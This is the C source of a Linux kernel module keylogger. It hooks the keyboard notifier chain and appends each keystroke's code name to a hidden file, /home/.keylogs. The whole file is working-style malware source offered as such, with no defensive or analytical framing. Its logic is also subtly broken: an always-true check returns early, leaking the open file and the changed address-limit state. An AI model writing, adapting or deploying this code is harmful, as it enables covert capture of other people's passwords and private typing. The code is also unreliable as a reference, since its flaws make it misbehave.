#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/mm.h>

// Keyboard hook
#include <linux/keyboard.h>
#include <linux/semaphore.h>

#include "private.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("d0lph1n98 <d0lph1n98@yahoo.com>");

static int 
key_hook(struct notifier_block *nblock, unsigned long code, void *_param) 
{
    struct file *fp;
    mm_segment_t fs;
    char *filename = "/home/.keylogs";
    
    fp = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if(IS_ERR(fp))
    {
        printk(KERN_ALERT "Error encountered while opening file %c.\n", *filename);
        return 1;
    }
    struct keyboard_notifier_param *param = _param;
    fs = get_fs();
    set_fs(KERNEL_DS);

    if(0 <= param->value || param->value > 50000) return NOTIFY_OK;

    fp->f_op->write(fp, keycode[param->value], strlen(keycode[param->value]), &fp->f_pos);
    set_fs(fs);
    filp_close(fp, NULL);

    return NOTIFY_OK;
}

static struct notifier_block keyboard_nb = {
    .notifier_call = key_hook
};

/* Module Init */
static int
__init keylog_init(void) 
{
    printk(KERN_INFO "Keylog started!\n");

    // Mount keyboard hook
    register_keyboard_notifier(&keyboard_nb);

    return 0;
}

/* Module Exit */
static void
__exit keylog_exit(void) 
{
    printk(KERN_INFO "Module Exit!\n");

    // Unmount keyboard hook
    unregister_keyboard_notifier(&keyboard_nb);
}

module_init(keylog_init);
module_exit(keylog_exit);
